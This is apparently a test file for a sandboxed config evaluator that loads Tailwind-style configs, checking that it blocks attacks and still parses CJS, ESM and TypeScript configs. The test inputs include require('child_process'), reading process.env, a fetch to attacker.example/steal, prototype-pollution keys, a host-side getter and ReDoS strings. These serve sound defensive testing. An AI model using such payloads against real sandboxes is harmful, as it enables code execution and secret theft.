// Copyright 2026 Google LLC
// SPDX-License-Identifier: Apache-2.0

import { describe, it, expect } from 'bun:test';
import { safeEvalConfig } from './safe-eval.js';

describe('safeEvalConfig — security', () => {
  it('blocks require() (no Node builtins in context)', () => {
    const src = `
      const cp = require('child_process');
      module.exports = { theme: { extend: { colors: { hacked: '#ff0000' } } } };
    `;
    const result = safeEvalConfig(src, 'js');
    expect(result.exports).toEqual({});
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings[0]).toMatch(/require/i);
  });

  it('blocks access to process', () => {
    const src = `
      const secrets = process.env;
      module.exports = secrets;
    `;
    const result = safeEvalConfig(src, 'js');
    expect(result.exports).toEqual({});
    expect(result.warnings.length).toBeGreaterThan(0);
  });

  it('blocks fetch / network', () => {
    const src = `
      fetch('https://attacker.example/steal');
      module.exports = {};
    `;
    const result = safeEvalConfig(src, 'js');
    expect(result.warnings.length).toBeGreaterThan(0);
  });

  it('blocks Buffer / globalThis', () => {
    const src = 'module.exports = { poc: globalThis.process };';
    const result = safeEvalConfig(src, 'js');
    // globalThis exists in vm but does not leak the host process object.
    // Inert-clone coerces undefined to null, so either is acceptable — the
    // invariant is "no host process object".
    const exp = result.exports as { poc?: unknown };
    expect(exp.poc === undefined || exp.poc === null).toBe(true);
  });

  it('times out on infinite loops (≤ 1.5s)', () => {
    const src = 'while (true) {}; module.exports = {};';
    const started = Date.now();
    const result = safeEvalConfig(src, 'js');
    const elapsed = Date.now() - started;
    expect(elapsed).toBeLessThan(1500);
    expect(result.warnings.some((w) => /timed?\s*out/i.test(w) || /script execution timed out/i.test(w))).toBe(true);
  });

  it('never throws — always returns a result object', () => {
    const src = 'this is not valid JS {{{{';
    const result = safeEvalConfig(src, 'js');
    expect(result).toBeDefined();
    expect(result.warnings.length).toBeGreaterThan(0);
  });

  it('strips getters from exports so host never invokes attacker code', () => {
    // If a getter survived, host-side Object.entries would execute this
    // throw and cross realms via Error.prepareStackTrace.
    const src = `
      module.exports = {
        theme: {
          get extend() { throw new Error('getter-ran-in-host'); },
        },
      };
    `;
    const result = safeEvalConfig(src, 'js');
    const cfg = result.exports as { theme?: { extend?: unknown } };
    // Accessing .theme.extend must NOT throw because the getter was stripped.
    expect(() => Object.entries(cfg.theme ?? {})).not.toThrow();
    expect(cfg.theme?.extend).toBeUndefined();
  });

  it('strips functions, symbols, and prototype chains from exports', () => {
    const src = `
      class Weird { constructor() { this.x = 1; } }
      const w = new Weird();
      w.fn = () => 'leak';
      w[Symbol('k')] = 'leak';
      module.exports = w;
    `;
    const result = safeEvalConfig(src, 'js');
    const out = result.exports as Record<string, unknown>;
    expect(typeof out.fn).not.toBe('function');
    expect(Object.getPrototypeOf(out)).toBe(null);
  });

  it('does NOT assign "__proto__" / "constructor" / "prototype" keys', () => {
    const src = `
      module.exports = {
        "__proto__": { polluted: true },
        "constructor": { polluted: true },
        "prototype": { polluted: true },
        real: "ok",
      };
    `;
    const result = safeEvalConfig(src, 'js');
    const out = result.exports as Record<string, unknown>;
    // The three dangerous keys are dropped; only "real" survives.
    expect(Object.keys(out)).toEqual(['real']);
    // Host Object.prototype was not mutated.
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
  });

  it('stripTypescript is linear on stacked `as` casts (no ReDoS)', () => {
    // 50k stacked `as Foo` casts with no terminator used to take ~28s on
    // the old lookahead-based regex. Must complete in well under a second.
    const src = '(x' + ' as Foo'.repeat(50000) + ');';
    const start = Date.now();
    const result = safeEvalConfig(src, 'ts');
    const elapsed = Date.now() - start;
    expect(result).toBeDefined();
    expect(elapsed).toBeLessThan(500);
  });

  it('stripTypescript is linear on stacked `satisfies` annotations', () => {
    const src = '(x' + ' satisfies Foo'.repeat(50000) + ');';
    const start = Date.now();
    safeEvalConfig(src, 'ts');
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(500);
  });
});

describe('safeEvalConfig — CommonJS configs work', () => {
  it('returns module.exports for a plain CJS config', () => {
    const src = `
      module.exports = {
        theme: {
          extend: {
            colors: { primary: "#112233" },
            borderRadius: { sm: "4px" },
          },
        },
      };
    `;
    const result = safeEvalConfig(src, 'js');
    const cfg = result.exports as { theme?: { extend?: { colors?: Record<string, string>; borderRadius?: Record<string, string> } } };
    expect(cfg.theme?.extend?.colors?.primary).toBe('#112233');
    expect(cfg.theme?.extend?.borderRadius?.sm).toBe('4px');
    expect(result.warnings.length).toBe(0);
  });
});

describe('safeEvalConfig — ESM configs work', () => {
  it('rewrites `export default` to module.exports', () => {
    const src = `
      export default {
        theme: { extend: { colors: { brand: "#ff0000" } } },
      };
    `;
    const result = safeEvalConfig(src, 'mjs');
    const cfg = result.exports as { theme?: { extend?: { colors?: Record<string, string> } } };
    expect(cfg.theme?.extend?.colors?.brand).toBe('#ff0000');
  });
});

describe('safeEvalConfig — TypeScript configs work', () => {
  it('strips `satisfies X` cast', () => {
    const src = `
      export default {
        theme: { extend: { colors: { brand: "#0000ff" } } },
      } satisfies import('tailwindcss').Config;
    `;
    const result = safeEvalConfig(src, 'ts');
    const cfg = result.exports as { theme?: { extend?: { colors?: Record<string, string> } } };
    expect(cfg.theme?.extend?.colors?.brand).toBe('#0000ff');
  });

  it('strips `as Config` cast', () => {
    const src = `
      const config = { theme: { extend: { colors: { x: "#111" } } } } as Config;
      export default config;
    `;
    const result = safeEvalConfig(src, 'ts');
    const cfg = result.exports as { theme?: { extend?: { colors?: Record<string, string> } } };
    expect(cfg.theme?.extend?.colors?.x).toBe('#111');
  });
});
